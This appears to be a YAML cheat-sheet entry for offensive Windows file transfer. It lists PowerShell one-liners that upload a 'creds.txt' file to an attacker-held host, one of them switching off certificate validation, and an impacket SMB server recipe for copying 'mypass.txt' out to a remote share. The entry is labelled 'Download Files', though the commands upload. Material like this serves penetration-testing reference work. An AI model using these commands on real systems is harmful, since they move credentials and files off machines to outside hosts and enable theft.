---
functions:
  file-transfer:
    - description: Download Files on Windows
      code: |
        +++++++++++POWERSHELL+++++++++++
        powershell -c (New-Object System.Net.WebClient).UploadFile('http://<ip>:<port>', 'creds.txt')
        powershell -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).UploadFile('https://10.0.0.4:8000', 'creds.txt')

        +++++++++++SMB+++++++++++
        SERVER: impacket-smbserver "share" . -smb2support
        CLIENT: (1) net use \\192.168.119.159\share   (2)  copy "mypass.txt" \\192.168.119.159\share\
---
